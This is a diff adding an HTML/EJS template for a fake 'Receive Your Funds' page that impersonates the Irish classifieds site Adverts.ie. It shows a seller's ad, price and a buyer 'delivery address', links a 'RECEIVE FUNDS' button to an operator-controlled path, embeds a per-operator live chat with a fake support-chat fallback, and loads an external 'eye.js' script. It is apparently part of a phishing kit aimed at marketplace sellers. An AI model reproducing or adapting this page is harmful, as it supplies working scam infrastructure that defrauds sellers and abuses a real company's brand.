@@ -1,0 +1,343 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Receive Your Funds - Adverts.ie</title>
+  <link rel="stylesheet" href="/css/support_parent.css" />
+  <link rel="shortcut icon" href="https://i.imgur.com/77YadJv.png" type="image/x-icon">
+
+  <style>
+    html,
+    body {
+      height: 100%;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      flex-direction: column;
+      font-family: 'Helvetica Neue', Arial, sans-serif;
+      background-color: #f4f4f4;
+    }
+
+    .main-content {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .header {
+      background-color: white;
+      padding: 10px 20px;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.05);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .header img {
+      height: 70px;
+    }
+
+    .container {
+      background: white;
+      margin: 30px auto;
+      padding: 25px;
+      border-radius: 12px;
+      box-shadow: 0 6px 12px rgba(0, 0, 0, 0.1);
+      width: 90%;
+      max-width: 400px;
+      text-align: center;
+    }
+
+    .photo {
+      width: 60%;
+      max-width: 200px;
+      border-radius: 10px;
+      margin-bottom: 20px;
+    }
+
+    .title {
+      font-size: 22px;
+      font-weight: bold;
+      color: #333;
+      margin-bottom: 20px;
+    }
+
+    .message {
+      font-size: 15px;
+      font-weight: 500;
+      color: #333;
+      background-color: #ffe9d9;
+      border-left: 4px solid #e06506;
+      padding: 16px 20px;
+      border-radius: 8px;
+      margin-bottom: 30px;
+      line-height: 1.6;
+      box-shadow: 0 1px 3px rgba(0, 0, 0, 0.05);
+    }
+
+    .verify-button {
+      display: inline-block;
+      padding: 12px 25px;
+      background-color: #e06506;
+      color: white;
+      text-decoration: none;
+      border-radius: 8px;
+      font-weight: bold;
+      font-size: 16px;
+      transition: background-color 0.3s ease;
+    }
+
+    .verify-button:hover {
+      background-color: #ed9b5d;
+    }
+
+    .adverts-footer {
+      background-color: #f5f5f5;
+      font-size: 14px;
+      color: #444;
+      padding: 40px 20px 10px;
+      border-top: 1px solid #ddd;
+    }
+
+    .footer-grid {
+      max-width: 1200px;
+      margin: 0 auto;
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+      gap: 40px;
+      margin-bottom: 40px;
+    }
+
+    .footer-col h4 {
+      font-weight: bold;
+      margin-bottom: 12px;
+      border-bottom: 1px solid #ddd;
+      padding-bottom: 5px;
+    }
+
+    .footer-col ul {
+      list-style: none;
+      padding: 0;
+      margin: 0;
+    }
+
+    .footer-col ul li {
+      margin-bottom: 8px;
+    }
+
+    .footer-col ul li a {
+      text-decoration: none;
+      color: #444;
+      transition: 0.3s;
+    }
+
+    .footer-col ul li a:hover {
+      text-decoration: underline;
+    }
+
+    .social-links img {
+      vertical-align: middle;
+      margin-right: 6px;
+    }
+
+    .footer-bottom-bar {
+      border-top: 1px solid #ddd;
+      padding-top: 15px;
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: space-between;
+      font-size: 13px;
+      color: #777;
+      max-width: 1200px;
+      margin: 0 auto;
+    }
+
+    .footer-bottom-bar a {
+      color: #777;
+      text-decoration: none;
+      margin: 0 4px;
+    }
+
+    .footer-bottom-bar a:hover {
+      text-decoration: underline;
+    }
+
+    .footer-bottom-bar .right {
+      text-align: right;
+    }
+
+    .price {
+      font-size: 18px;
+      font-weight: bold;
+      color: #555;
+      margin-bottom: 20px;
+    }
+    .instructions {
+  text-align: left;
+  margin-top: 20px;
+}
+
+.step {
+  display: flex;
+  align-items: flex-start;
+  gap: 12px;
+  margin-bottom: 20px;
+}
+
+.step svg {
+  flex-shrink: 0;
+  margin-top: 4px;
+}
+
+.step p {
+  margin: 0;
+  font-size: 14px;
+  color: #333;
+  line-height: 1.5;
+}
+
+  </style>
+</head>
+<body>
+  <main class="main-content">
+    <div class="header">
+      <img src="https://i.imgur.com/oTAF826.png" alt="Adverts.ie Logo" />
+    </div>
+
+    <div class="container">
+      <img src="<%= ad.photo %>" alt="Ad Photo" class="photo">
+      <div class="title">
+        <%= ad.title %>
+      </div>
+      <div class="price">
+        <%= ad.price %>
+      </div>
+
+      <!-- Добавленный блок с адресом доставки -->
+      <div class="address" style="margin: 10px 0; font-size: 15px; color: #333;">
+        <b>Delivery Address:</b> <%= ad.address %>
+      </div>
+
+      <div class="instructions">
+        <div class="step">
+          <svg width="26" height="26" fill="#e06506" viewBox="0 0 24 24">
+            <path d="M21 13H3v-2h18v2Zm-2 8H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2Zm0-2V5H5v14h14ZM7 7h10v2H7V7Zm0 4h7v2H7v-2Zm0 4h10v2H7v-2Z"></path>
+          </svg>
+          <p>
+            <b>After receipt of funds</b>, please send the goods to the buyer according to the given data or
+            hand over the goods to the courier who will call you back within <b>12 hours</b>.
+          </p>
+        </div>
+
+        <div class="step">
+          <svg width="26" height="26" fill="#e06506" viewBox="0 0 24 24">
+            <path d="M21 16V4H3v12h18Zm-2-2H5V6h14v8Zm-4 4v2H9v-2H3v2a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-2h-6ZM9 8h2v2H9V8Zm4 0h2v2h-2V8Z"></path>
+          </svg>
+          <p>
+            <b>After shipment</b>, please indicate the <b>tracking number</b> to the buyer. The item must be shipped within <b>3 days</b> after receipt of payment.
+          </p>
+        </div>
+      </div>
+
+      <a href="/ad/<%= ad.id %>" class="verify-button">RECEIVE FUNDS</a>
+    </div>
+
+
+
+    <div id="support">
+      <script type="text/javascript">
+        var _smartsupp = _smartsupp || {};
+        _smartsupp.key = '<%=user.smartsupp%>';
+        window.smartsupp || (function (d) {
+          var s, c, o = smartsupp = function () { o._.push(arguments) }; o._ = [];
+          s = d.getElementsByTagName('script')[0]; c = d.createElement('script');
+          c.type = 'text/javascript'; c.charset = 'utf-8'; c.async = true;
+          c.src = 'https://www.smartsuppchat.com/loader.js?'; s.parentNode.insertBefore(c, s);
+        })(document);
+      </script>
+    </div>
+  </main>
+
+  <footer class="adverts-footer">
+    <div class="footer-grid">
+      <div class="footer-col">
+        <h4>Our friends</h4>
+        <ul>
+          <li><a href="#">Distilled.ie</a></li>
+          <li><a href="#">Daft.ie</a></li>
+          <li><a href="#">DoneDeal.ie</a></li>
+          <li><a href="#">Work at Adverts.ie</a></li>
+        </ul>
+      </div>
+      <div class="footer-col">
+        <h4>Help centre</h4>
+        <ul>
+          <li><a href="#">Search our help centre</a></li>
+          <li><a href="#">Ask us a question</a></li>
+          <li><a href="#">Terms & conditions</a></li>
+          <li><a href="#">Privacy policy</a></li>
+          <li><a href="#">Cookie policy</a></li>
+          <li><a href="#">Consent choices</a></li>
+          <li><a href="#">Data requests</a></li>
+        </ul>
+      </div>
+      <div class="footer-col">
+        <h4>FAQs</h4>
+        <ul>
+          <li><a href="#">Lost password</a></li>
+          <li><a href="#">Report an ad or user</a></li>
+          <li><a href="#">How to close your account</a></li>
+          <li><a href="#">Seller fees explained</a></li>
+        </ul>
+      </div>
+      <div class="footer-col">
+        <h4>Join us!</h4>
+        <ul class="social-links">
+          <li><a href="#"><img src="https://img.icons8.com/ios-glyphs/20/000000/instagram-new.png" /> Adverts.ie on Instagram</a></li>
+          <li><a href="#"><img src="https://img.icons8.com/ios-glyphs/20/000000/facebook-new.png" /> Adverts.ie on Facebook</a></li>
+          <li><a href="#"><img src="https://img.icons8.com/ios-glyphs/20/000000/twitter--v1.png" /> Adverts.ie on X</a></li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="footer-bottom-bar">
+      <div class="left">© Adverts Marketplace Ltd. 2006–2025</div>
+      <div class="right">
+        <a href="#">Help & Support</a> |
+        <a href="#">Browse all ads</a> |
+        <a href="#">Banner advertising</a> |
+        <a href="#">Privacy</a> |
+        <a href="#">Cookies</a> |
+        <a href="#">Terms</a> |
+        <a href="#">Categories</a> |
+        <a href="#">About us</a> |
+        <a href="#">Contact us</a>
+      </div>
+    </div>
+  </footer>
+
+  <script>
+    if ("<%=user.smartsupp%>" == false) {
+      document.querySelector('#support').innerHTML = `
+      <div class="chatra--webkit chatra--style-round chatra--side-bottom chatra--pos-right chatra--visible chatra--expanded chatra--fast-toggle"
+           id="chatra" style="width: 380px; height: 600px; transform: none; z-index: 2147483647; display: none;">
+        <div id="chatra__iframe-wrapper">
+          <iframe frameborder="0" id="chatra__iframe" allowtransparency="true" title="Chatra live chat" allow="autoplay"
+            src="/supportChatFrame/<%=ad.id%>" style="width: 380px; height: 600px; position: absolute"></iframe>
+        </div>
+      </div>
+      <div class="support-circle" onclick="document.querySelector('#chatra').style.display = 'block';style.display = 'none'"></div>
+    `
+    }
+  </script>
+
+  <script>
+    const adId = "<%=ad.id%>"
+  </script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.19.2/axios.min.js"></script>
+  <script src="/js/eye.js" defer></script>
+</body>
+
+</html>
